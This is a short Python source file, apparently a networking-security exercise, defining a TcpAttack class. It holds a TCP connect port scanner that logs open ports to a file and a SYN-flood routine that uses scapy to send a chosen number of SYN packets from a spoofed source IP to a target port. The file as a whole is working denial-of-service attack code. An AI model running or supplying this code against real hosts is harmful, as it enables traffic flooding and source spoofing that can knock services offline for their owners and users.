#import sys
from scapy.all import IP, TCP, send, RandShort
import socket

class TcpAttack():
    def __init__(self, spoofIP:str, targetIP:str)->None:
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.ports = []

    def scanTarget(self, rangeStart:int, rangeEnd:int)->None:
        FILEOUT = open("openports.txt", 'w')
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testport))
                FILEOUT.write(str(testport))
                print(str(testport))
                FILEOUT.write(" ")
                self.ports.append(testport)
            except Exception as e:
                pass
                
    def attackTarget(self, port:int, numSyn:int)->int:
        self.scanTarget(port, port)
        if port not in self.ports:
            print("port not open")
            return 0
        
        for i in range(numSyn):
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(str(e))
        return